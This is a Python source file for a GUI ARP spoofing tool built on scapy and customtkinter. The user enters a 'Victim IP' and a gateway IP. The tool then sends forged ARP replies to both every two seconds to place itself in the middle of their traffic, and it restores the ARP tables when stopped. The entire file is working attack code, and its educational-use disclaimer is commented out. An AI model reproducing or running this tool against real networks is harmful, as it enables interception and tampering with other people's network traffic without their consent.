import customtkinter as ctk
import scapy.all as scapy
import threading
import time
from typing import Optional

class ScapyWrapper:
    def __init__(self):
        self.sent_packets_count = 0
        
    def get_mac(self, ip: str) -> Optional[str]:
        """Get MAC address for given IP."""
        arp_request = scapy.ARP(pdst=ip)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast/arp_request
        
        try:
            answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
            return answered_list[0][1].hwsrc
        except IndexError:
            return None
            
    def send_arp_packet(self, target_ip: str, spoof_ip: str, target_mac: str):
        """Send ARP packet to target."""
        packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
        scapy.send(packet, verbose=False)
        
    def restore_arp(self, destination_ip: str, source_ip: str):
        """Restore ARP tables to normal state."""
        destination_mac = self.get_mac(destination_ip)
        source_mac = self.get_mac(source_ip)
        
        packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac,
                          psrc=source_ip, hwsrc=source_mac)
        scapy.send(packet, count=4, verbose=False)

class StatusLogger:
    def __init__(self):
        self.messages = []
        
    def log(self, message: str):
        """Log a message."""
        self.messages.append(f"[{time.strftime('%H:%M:%S')}] {message}")
        
    def clear(self):
        """Clear all logged messages."""
        self.messages.clear()

class NetworkManager:
    def __init__(self):
        self.scapy_wrapper = ScapyWrapper()
        self.target_ip = ""
        self.gateway_ip = ""
        self.spoofing_active = False
        
    def start_spoofing(self, target_ip: str, gateway_ip: str):
        """Start ARP spoofing attack."""
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        self.spoofing_active = True
        
        target_mac = self.scapy_wrapper.get_mac(target_ip)
        if not target_mac:
            raise ValueError(f"Could not get MAC address for target {target_ip}")
            
        threading.Thread(target=self._spoof_loop, args=(target_ip, gateway_ip, target_mac)).start()
        
    def _spoof_loop(self, target_ip: str, gateway_ip: str, target_mac: str):
        """Main spoofing loop."""
        while self.spoofing_active:
            # Send ARP packets to both target and gateway
            self.scapy_wrapper.send_arp_packet(target_ip, gateway_ip, target_mac)
            self.scapy_wrapper.send_arp_packet(gateway_ip, target_ip, 
                                             self.scapy_wrapper.get_mac(gateway_ip))
            time.sleep(2)
            
    def stop_spoofing(self):
        """Stop ARP spoofing attack and restore ARP tables."""
        if self.spoofing_active:
            self.spoofing_active = False
            # Restore ARP tables automatically when stopping
            try:
                self.scapy_wrapper.restore_arp(self.target_ip, self.gateway_ip)
                self.scapy_wrapper.restore_arp(self.gateway_ip, self.target_ip)
            except Exception as e:
                print(f"Error restoring ARP tables: {str(e)}")

class GUIController:
    def __init__(self, app):
        self.app = app
        self.status_logger = StatusLogger()
        self.setup_gui()
        
    def setup_gui(self):
        """Setup GUI elements."""
        # Input Frame
        input_frame = ctk.CTkFrame(self.app.root)
        input_frame.pack(padx=10, pady=10, fill="both", expand=True)
        
        ctk.CTkLabel(input_frame, text="Victim IP:").grid(row=0, column=0, padx=5, pady=5)
        self.victim_entry = ctk.CTkEntry(input_frame, placeholder_text="e.g., 192.168.1.100")
        self.victim_entry.grid(row=0, column=1, padx=5, pady=5)
        
        ctk.CTkLabel(input_frame, text="Gateway IP:").grid(row=1, column=0, padx=5, pady=5)
        self.gateway_entry = ctk.CTkEntry(input_frame, placeholder_text="e.g., 192.168.1.1")
        self.gateway_entry.grid(row=1, column=1, padx=5, pady=5)
        
        # Control Frame
        control_frame = ctk.CTkFrame(self.app.root)
        control_frame.pack(padx=10, pady=5)
        
        self.start_button = ctk.CTkButton(control_frame, text="Start Spoofing",
                                     command=self.start_spoofing)
        self.start_button.grid(row=0, column=0, padx=5)
        
        self.stop_button = ctk.CTkButton(control_frame, text="Stop Spoofing",
                                    command=self.stop_spoofing)
        self.stop_button.grid(row=0, column=1, padx=5)
        
        # Status Frame
        status_frame = ctk.CTkFrame(self.app.root)
        status_frame.pack(padx=10, pady=5, fill="both", expand=True)
        
        self.status_text = ctk.CTkTextbox(status_frame, height=10, width=50)
        self.status_text.pack(padx=5, pady=5, fill="both", expand=True)
        
        # # Add a disclaimer
        # disclaimer = "DISCLAIMER: This tool is for educational purposes only. Use responsibly and only on networks you own or have permission to test."
        # disclaimer_label = ctk.CTkLabel(self.app.root, text=disclaimer, 
        #                              font=("Helvetica", 10), text_color="gray")
        # disclaimer_label.pack(pady=5)
        
    def start_spoofing(self):
        """Handle start spoofing button click."""
        try:
            victim_ip = self.victim_entry.get()
            gateway_ip = self.gateway_entry.get()
            
            if not victim_ip or not gateway_ip:
                raise ValueError("Please enter both IPs")
                
            self.app.network_manager.start_spoofing(victim_ip, gateway_ip)
            self.update_status("ARP spoofing started...")
        except Exception as e:
            self.update_status(f"Error: {str(e)}")
            
    def stop_spoofing(self):
        """Handle stop spoofing button click."""
        self.app.network_manager.stop_spoofing()
        self.update_status("ARP spoofing stopped and ARP tables restored.")
        
    def update_status(self, message):
        """Update status text."""
        self.status_logger.log(message)
        self.status_text.configure(state="normal")
        self.status_text.delete("1.0", "end")
        for msg in self.status_logger.messages[-10:]:
            self.status_text.insert("end", f"{msg}\n")
        self.status_text.configure(state="disabled")

class ARP_SpoofingApp:
    def __init__(self):
        self.root = ctk.CTk()
        self.root.title("ARP Spoofing Tool")
        self.network_manager = NetworkManager()
        
    def setup_gui(self):
        """Setup main application window."""
        self.root.geometry("500x400")
        self.gui_controller = GUIController(self)
        
    def run(self):
        """Run the application."""
        self.setup_gui()
        self.root.mainloop()

if __name__ == "__main__":
    app = ARP_SpoofingApp()
    app.run()